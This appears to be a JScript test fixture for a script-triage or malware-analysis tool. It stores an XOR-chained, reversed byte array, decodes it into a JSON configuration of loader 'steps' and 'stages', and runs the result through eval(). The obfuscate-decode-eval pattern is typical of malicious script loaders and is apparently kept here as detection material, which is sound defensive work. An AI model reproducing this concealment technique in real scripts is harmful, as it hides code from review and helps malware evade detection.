// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_dd484c0b(storedMaterial) {
  var recoveredMaterial = [];
  var previous = 203;
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ previous); previous = storedMaterial[i]; }
  return recoveredMaterial;
}
function recover_3420858a() {
  // configuration reconstruction
  var storedMaterial = [204,177,130,184,154,238,128,245,154,217,188,219,186,206,189,159,179,206,236,152,249,157,179,134,180,134,183,211,226,214,227,135,227,206,171,204,173,217,170,246,170,200,169,229,150,229,128,242,134,232,157,213,137,213,182,223,179,209,164,244,168,244,135,245,144,227,182,234,182,140,207,237,215,245,157,233,136,248,167,194,174,199,161,131,175,141,184,138,184,137,237,220,232,221,185,221,242,144,241,189,206,189,216,170,222,176,197,141,175,149,183,195,173,200,175,206,145,227,134,245,128,162,142,172,216,185,221,243,145,244,150,161,144,241,147,161,142,234,131,239,142,248,150,255,209,180,216,168,197,164,220,185,151,162,144,162,147,247,198,242,199,163,199,232,199,253,142,254,138,254,150,180,142,172,192,178,199,229,201,235,222,236,222,239,139,186,142,187,223,187,150,248,159,246,151,231,138,235,136,170,144,178,214,191,224,142,233,128,225,145,252,157,254,220,167,157,191,204,169,220,176,209,167,133,169,139,238,150,243,221,164,199,174,194,173,253,132,240,153,235,158,253,152,203,172,197,163,205,162,225,195,249,219,169,204,184,200,169,205,172,142,162,255,221,184,204,163,206,171,217,134,226,131,236,128,240,133,167,139,169,219,190,216,171,197,164,214,162,253,152,234,139,251,158,236,156,190,146,176,220,189,222,177,221,130,231,147,242,145,254,146,176,235,209,243,128,240,149,225,146,176];
  storedMaterial.reverse();

  var recoveredMaterial = [];
  var state = 1;
  switch (state) { case 1: recoveredMaterial = decode_dd484c0b.call(null, storedMaterial); break; default: recoveredMaterial = []; }
  var configurationText;
  configurationText = "";
  for (var bi = 0; bi < recoveredMaterial.length; bi++) { configurationText += String.fromCharCode(recoveredMaterial[bi]); }
  return configurationText;
  // end reconstruction
}
function inspect_f5bd743d() {
  var configuration = eval("(" + recover_3420858a.call(null) + ")");
  var analysisPlan = new Object();
  analysisPlan["steps"] = configuration["steps"];
  analysisPlan["adapter"] = configuration["adapter"];
  analysisPlan["values"] = configuration["values"];
  analysisPlan["stageCount"] = configuration["stageCount"];
  return analysisPlan;
}
